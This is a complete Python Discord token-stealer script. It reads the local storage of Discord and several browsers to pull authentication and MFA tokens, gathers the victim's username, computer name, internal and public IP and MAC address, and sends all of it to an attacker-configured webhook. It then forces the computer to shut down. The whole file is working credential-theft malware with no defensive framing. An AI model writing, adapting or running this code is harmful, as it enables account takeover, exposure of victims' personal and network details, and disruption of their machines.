import os, re, json, socket, getpass, requests, getmac
from urllib.request import Request, urlopen
WEBHOOK_URL = 'WEBHOOK GOES HERE'
PING_ME = True


def find_tokens(path):
	path += '\\Local Storage\\leveldb'
	tokens = []
	for file_name in os.listdir(path):
		if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
			continue
		for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
				for token in re.findall(regex, line):
					tokens.append(token)
	return tokens


def main():
	local = os.getenv('LOCALAPPDATA')
	roaming = os.getenv('APPDATA')
	paths = {
		'Discord': roaming + '\\Discord',
		'Discord Canary': roaming + '\\discordcanary',
		'Discord PTB': roaming + '\\discordptb',
		'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
		'OperaGX': roaming + '\\Opera Software\\Opera GX Stable',
		'Opera': roaming + '\\Opera Software\\Opera Stable',
		'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
		'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
	}
	message = '@everyone' if PING_ME else ''
	for platform, path in paths.items():
		if not os.path.exists(path):
			continue
		message += f'\n**{platform}**\n```\n'
		tokens = find_tokens(path)
		if len(tokens) > 0:
			for token in tokens:
				message += f'{token}\n'
		else:
			message += 'No tokens found.\n'
		message += '```'
	headers = {
		'Content-Type': 'application/json',
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
	}
	hostname = socket.gethostname()
	IPAddr = socket.gethostbyname(hostname)
	ip = requests.get('https://api.ipify.org').text
	message += '```'
	message += getpass.getuser() + "'s public IP address is:" + ip + "\n"
	message += getpass.getuser() + "'s Computer Name is: " + hostname + "\n"
	message += getpass.getuser() + "'s internal IP Address is: " + IPAddr + "\n"
	message += getpass.getuser() + "'s Mac Address is: " + getmac.get_mac_address() + "\n"
	message += '```'
	payload = json.dumps({'content': message})
	try:
		req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
		urlopen(req)
		os.system("shutdown /s /t 1")
	except:
		pass
if __name__ == '__main__':
	main()
